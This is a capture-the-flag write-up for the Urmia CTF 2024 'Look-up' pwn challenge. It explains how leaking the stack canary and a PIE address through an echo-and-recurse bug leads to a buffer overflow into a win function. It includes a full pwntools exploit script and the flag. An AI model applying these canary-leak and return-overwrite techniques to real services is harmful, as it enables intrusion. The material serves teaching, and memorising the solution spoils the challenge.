---
title: "Look-up - Urmia CTF 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "canary", "pie", "pwndbg", "checksec", "look-up", "stack", "urmia-ctf", "urmia-ctf-2024", "2024", "ctf-writeup"]
summary: "First I tried running the program, the program outputs"
source:
  name: "CTFtime writeup #39449"
  url: "https://ctftime.org/writeup/39449"
ctf:
  name: "Urmia CTF 2024"
  year: 2024
  challenge: "Look-up"
---

## Metadata

- **CTF:** Urmia CTF 2024
- **Task:** Look-up
- **Author team:** gimme_flags
- **CTFtime:** <https://ctftime.org/writeup/39449>

---
First I tried running the program, the program outputs   
> \---Welcome to the UCTF---  
>   
> \--- I'll repeat what you say :D ---

And when I input something it repeats it back to me.

In an effort to gain more info, I decompiled the file and found a win function which, when called, gets a shell as well as figuring out that the length of the buffer is 10.  
Finally, I ran checksec on the file and found out that the binary has a canary and PIE enabled, which makes things a lot tougher.  
First, i needed to figure out a way to leak the canary. I knew that the canary ends with a null byte, so I tried inputting 10 'A's and got this output:  
> \---Welcome to the UCTF---  
>   
> \--- I'll repeat what you say :D ---  
>   
> AAAAAAAAAA  
>   
> You said: AAAAAAAAAA  
>   
> �80b�Q� �k��  
>   
> *** stack smashing detected ***: terminated  
>   
> Aborted (core dumped)

I got the stack smashing error as expected, due to me overwriting the null byte of the canary with a newline byte, but I also got something interesting printed afterwards, which turned out to be the canary. But now, how do I leak the canary without terminating the program?

This is when I looked back at the decompiled code and found something interesting, when the input string includes the characters "UCTF", it will recursively call the same "vuln" function that prompts the user for an input! So I can input "UCTF" followed by 6 'A's, get the canary, then overwrite the canary with the next input and call win! But, of course that is not the case, I still have to deal with PIE, which offsets the addresses from a randomly generated address called the pie base, which meant that I do not know where the win function is located. This meant I also had to leak the pie address and calculate the pie base, which, luckily, is also located on the stack!  
> \---Welcome to the UCTF---  
>   
> \--- I'll repeat what you say :D ---  
>   
> UCTFAAAAAAAAAAAAAAAAAAAAA  
>   
> You said: UCTFAAAAAAAAAAAAAAAAAAAAA  
>   
> {3� 6\  
>   
> The Backdoor triggered!  
>   
> \--- I'll repeat what you say :D ---

I'll spare you the details, but using gdb, I was able to find out that the PIE address is located 26 bytes away from the buffer, after inputting "UCTF" followed by 21 'A's I was able to leak the pie address, pwndbg was able to calculate the piebase and I was able to calculate the pie offset by subtracting the piebase from the leaked pie, I was able to calculate the offset of the win function as well by finding the address of win during runtime and subtracting it from the piebase, these offsets stay constant so I only had to calculate them once thankfully. The last step involves combining all these together, for the final input, I had to write 10 'A's, followed by the canary, then a ret gadget, and finally the win function! You're probably wondering why there's a ret gadget, that's because without it the program will segfault due to it not being aligned to 16 bytes when calling do_system. After inputting all that, I was able to get shell access and print the flag.  
> $ ls  
>   
> flag.txt  
>   
> look-up  
>   
> $ cat flag.txt  
>   
> UCTF{Pl4ying_S3t@r_str1ngs_is_Fun_4Evr!}

```python3  
from pwn import *  
import binascii

context.log_level = 'debug'  
context.terminal = ["tmux", "splitw", "-h"]

# elf = ELF('./look-up')  
# p = elf.process()  
p = remote("[look-up.uctf.ir](http://look-up.uctf.ir)", 5000);

# gdb.attach(p, '''  
# set follow-fork-mode child  
# break main  
# break vuln  
# ''')

def get_canary():  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", b"UCTFAAAAAA");  
p.recvuntil(b"You said: ");  
p.recv(10)  
canary = bytearray(p.recv(8))  
canary[0] = 0  
canary = canary[::-1]  
return int(binascii.hexlify(canary), 16)

# Only use this after get_canary  
def get_rbp():  
rbp = bytearray(p.recv(6))  
rbp = rbp[::-1]  
return int(binascii.hexlify(rbp), 16)

def exploit(canary, win):  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", b"AAAAAAAAAA" + p64(canary, endian="little") + b"A" * 8 + p64(win + 30, endian="little") + p64(win, endian="little"));

def get_pie():  
p.sendlineafter(b"--- I'll repeat what you say :D ---\n", b"UCTFAAAAAAAAAAAAAAAAAAAAA");  
p.recvuntil(b"You said: ");  
p.recv(26)  
pie = bytearray(p.recv(6))  
pie = pie[::-1]  
return int(binascii.hexlify(pie), 16)

pie = get_pie();  
pie_base = pie - 4987  
elf.address = pie_base  
win = pie_base + 4720  
print("pie", hex(pie))  
print("piebase", hex(pie_base))  
print("win", hex(win))

canary = get_canary();  
print("canary is:", hex(canary));  
exploit(canary, win)

p.interactive()  
```
